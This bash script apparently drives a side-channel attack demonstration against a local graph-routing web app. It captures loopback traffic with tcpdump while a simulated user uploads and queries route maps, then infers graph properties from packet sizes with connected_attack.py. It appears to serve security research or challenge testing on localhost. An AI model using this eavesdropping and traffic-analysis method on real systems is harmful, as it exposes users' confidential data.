#!/bin/bash
set -e

# rebuild?
REBUILD=0

if [ "$#" -eq 1 ]; then
    if [ "$1" == "rebuild" ]; then
        REBUILD=1
    fi
fi

export PYTHONPATH=$PYTHONPATH:../../../examples

# step 0, if necessary, gather data for mapping packet sizes to number of vertices in the uploaded graph
# Note: this does not currently work automatically.  Please view output and update connected_attack.py accordingly
if [ $REBUILD -eq 1 ]; then
    echo "analyze sizes of connected/disconnected graph properties"
    python connected_attack.py 127.0.0.1 8443 lo sizes.db build

else # not going ahead with attack immediately after building.  Must clean airplan.db between build and attack, as the graph ids are affected by the build

# step 1, start tcpdump
echo "Start eavesdropping on user"
/usr/sbin/tcpdump -i lo -w usertraffic.pcap tcp port 8443 > /dev/null &
TCPDUMP_PID=$!
sleep 1

# step 2, have a normal user login and perform graph uploads unknown to attacker
echo "User performs some airplan operations"
../../../examples/login.sh usr pwd

# upload a route map
curl -0 -L -4 -s -b cookies.txt -F file=@connected_map2.txt -F "route_map_name=connected_map_two" --insecure https://localhost:8443/add_route_map > /dev/null
echo "Uploaded a graph"

#select weight option and view properties
curl -0 -L -4 -s -b cookies.txt -F  "weight-type=Cost" --insecure https://localhost:8443/map_properties/1553932502 > /dev/null
echo "Viewed graph properties"

#view graph matrix
curl -0 -L -4 -s -b cookies.txt -F  "weight-type=Cost" --insecure https://localhost:8443/passenger_capacity_matrix/1553932502 > /dev/null
echo "Viewed graph matrix"


# find a capacity
curl -0 -L -4 -s -b cookies.txt -F "origin=5" -F "destination=1" -F "weight=Cost" --insecure https://localhost:8443/capacity/1553932502 > /dev/null
echo "Found graph capacity"


# upload a route map
curl -0 -L -4 -s -b cookies.txt -F file=@disconnected_map2.txt -F "route_map_name=disc2" --insecure https://localhost:8443/add_route_map > /dev/null
echo "Uploaded another graph"

#view properties
curl -0 -L -4 -s -b cookies.txt -F  "weight-type=Passengers" --insecure https://localhost:8443/map_properties/51321412 > /dev/null
echo "Viewed graph properties"


#curl -4 -s -b cookies.txt --insecure https://localhost:8443/route_map/5 # uncomment to see what the node ids are
#echo "map21"

#curl -4 -s -b cookies.txt --insecure https://localhost:8443 # uncomment to see what the graph ids are
#echo "all maps"

# find a shortest path
curl -0 -4 -s -L -b cookies.txt -F "origin=5" -F "destination=7" -F "weight-type=Cost" --insecure https://localhost:8443/shortest_path/51321412 > /dev/null
echo "Got shortest path"


# find crew assignment
curl -0 -4 -s -L -b cookies.txt --insecure https://localhost:8443/crew_management/51321412 > /dev/null
echo "Got crew assignments"


sleep 2

# step 3, stop tcpdump
echo "Stop eavesdropping"
kill $TCPDUMP_PID > /dev/null

# step 4, determine sizes of graphs sent
echo "Determine connectedness for graphs whose properties were displayed."
python connected_attack.py 127.0.0.1 8443 lo property_sizes.db attack usertraffic.pcap
fi
